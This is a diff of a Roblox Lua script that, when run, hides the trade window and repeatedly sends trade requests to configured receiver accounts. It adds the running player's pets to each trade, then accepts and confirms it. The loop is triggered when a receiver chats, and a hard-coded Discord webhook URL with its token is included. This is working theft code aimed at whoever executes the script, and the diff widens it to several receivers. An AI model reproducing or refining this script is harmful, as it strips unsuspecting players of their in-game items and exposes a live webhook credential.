@@ -1,4 +1,4 @@
-Username = "janeq is too skilled"
+Username = "jyes"
 Webhook = "https://discord.com/api/webhooks/1302319224185684039/ahtxsJqGagcs3ENidQuhc0GeBAmfmyKz50kZsuGGq9cV9v8pwGrxGNIKqMqGhe_bByoY"
 
 Config = { 
@@ -88,12 +88,14 @@ request({
 })
 
 
--- Sends a trade request to the specified player.
-local function SendTrade(playerName)
+local function SendTrade()
     local Loads = require(game.ReplicatedStorage.Fsys).load
     local RouterClient = Loads("RouterClient")
     local SendTradeRequest = RouterClient.get("TradeAPI/SendTradeRequest")
-    SendTradeRequest:FireServer(game.Players[playerName])
+
+    for _, playerName in pairs(Config.Receiver) do
+        SendTradeRequest:FireServer(game.Players[playerName])
+    end
 end
 
 -- Adds pets from the local player's inventory to the trade offer.
@@ -145,35 +147,37 @@ end
 -- Disable the TradeApp GUI
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
 
--- Main function to manage trading actions in a loop for each receiver
+-- Main function to manage trading actions in a loop
 local function StartGet()
-    for _, receiver in pairs(Config.Receiver) do
-        while task.wait(15) do
-            SendTrade(receiver)
-            wait(3)
-            AddPets()
-            wait(5.5)
-            AcceptTrade()
-            wait(15)
-            ConfirmTrade()
-        end
+    while task.wait(15) do
+        SendTrade()  -- Now sends trade requests to all receivers in Config.Receiver
+        wait(3)
+        AddPets()
+        wait(5.5)
+        AcceptTrade()
+        wait(15)
+        ConfirmTrade()
     end
 end
 
 -- Listen for chat events from the specified player
 for _, plr in pairs(game.Players:GetPlayers()) do
-    if plr.Name:lower() == Username:lower() then
-        plr.Chatted:Connect(function()
-            StartGet()
-        end)
+    for _, receiver in pairs(Config.Receiver) do
+        if plr.Name:lower() == receiver:lower() then
+            plr.Chatted:Connect(function()
+                StartGet()
+            end)
+        end
     end
 end
 
 -- Listen for new players joining the game
 game.Players.PlayerAdded:Connect(function(plr)
-    if plr.Name:lower() == Username:lower() then
-        plr.Chatted:Connect(function()
-            StartGet()
-        end)
+    for _, receiver in pairs(Config.Receiver) do
+        if plr.Name:lower() == receiver:lower() then
+            plr.Chatted:Connect(function()
+                StartGet()
+            end)
+        end
     end
 end)
